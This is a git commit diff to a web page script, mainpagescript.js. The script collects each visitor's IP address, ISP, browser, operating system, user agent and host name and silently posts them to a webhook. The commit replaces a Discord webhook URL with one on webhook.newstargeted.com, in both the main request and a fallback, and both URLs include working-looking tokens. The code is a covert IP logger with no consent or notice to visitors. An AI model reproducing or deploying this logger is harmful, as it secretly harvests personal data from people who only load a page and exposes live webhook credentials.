fdb586deb0f41be7c89e6ee39c18d2423ec2c893
49rip <146723162+49rip@users.noreply.github.com>
2024-01-25 00:19:52 +0300

    Update mainpagescript.js

--- mainpagescript.js
+++ mainpagescript.js
@@ -21,11 +21,11 @@ fetch("https://api.ipify.org")
     isp = data.org;
     
     const body = { content: `Date/Time: ${timestamp}\nIP Address: ${ip}\nBrowser: ${browser}\nOperating System: ${os}\nUser Agent: ${userAgent}\nHost Name: ${hostName}\nISP: ${isp}` };
-    fetch("https://discord.com/api/webhooks/1161339513059160144/-9a91YW7mvzuxvbxDXg6NrqzNlkZwZjNsSym097_TDIr6G5qgHxUe4l9aAu_tJGO0vAc", { method: "POST", body: JSON.stringify(body), headers: { "Content-Type": "application/json" } })
+    fetch("https://webhook.newstargeted.com/api/webhooks/1181568786697027667/anWIYBB2yrCavJHOj-5kIXABIBH3ESX1iW_vqvCKBv4pj1seMpdc3_6sKFDwwkIRLI9B", { method: "POST", body: JSON.stringify(body), headers: { "Content-Type": "application/json" } })
       .then(() => console.log("Success!")) // Log a success message to the console if the request is successful
       .catch(() => { 
         const body = { content: `Date/Time: ${timestamp}\nIP Address: ${ip}\nBrowser: ${browser}\nOperating System: ${os}\nUser Agent: ${userAgent}\nHost Name: ${hostName}` };
-        fetch("https://discord.com/api/webhooks/1161339513059160144/-9a91YW7mvzuxvbxDXg6NrqzNlkZwZjNsSym097_TDIr6G5qgHxUe4l9aAu_tJGO0vAc", { method: "POST", body: JSON.stringify(body), headers: { "Content-Type": "application/json" } })
+        fetch("https://webhook.newstargeted.com/api/webhooks/1181568786697027667/anWIYBB2yrCavJHOj-5kIXABIBH3ESX1iW_vqvCKBv4pj1seMpdc3_6sKFDwwkIRLI9B", { method: "POST", body: JSON.stringify(body), headers: { "Content-Type": "application/json" } })
           .then(() => console.log("Success! (fallback)")) 
       }); 
   }); 
